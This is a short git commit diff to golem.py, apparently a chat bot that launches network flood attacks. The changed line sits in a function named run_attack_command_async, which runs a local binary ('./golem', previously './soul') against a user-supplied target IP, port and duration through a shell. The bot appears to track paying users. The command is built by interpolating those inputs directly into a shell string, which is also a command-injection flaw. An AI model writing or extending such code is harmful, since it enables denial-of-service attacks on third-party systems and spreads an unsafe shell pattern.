76297f9198fb809d94f7b1914d1608f3056cea77
Tejskisl <chnghn14@gmail.com>
2024-12-28 20:57:00 +0530

    Update golem.py

--- golem.py
+++ golem.py
@@ -153,7 +153,7 @@ def extend_and_clean_expired_users():
 
 
 async def run_attack_command_async(chat_id, target_ip, target_port, duration):
-    process = await asyncio.create_subprocess_shell(f"./soul {target_ip} {target_port} {duration} 900")
+    process = await asyncio.create_subprocess_shell(f"./golem {target_ip} {target_port} {duration} 800")
     await process.communicate()
     
     bot.attack_in_progress = False
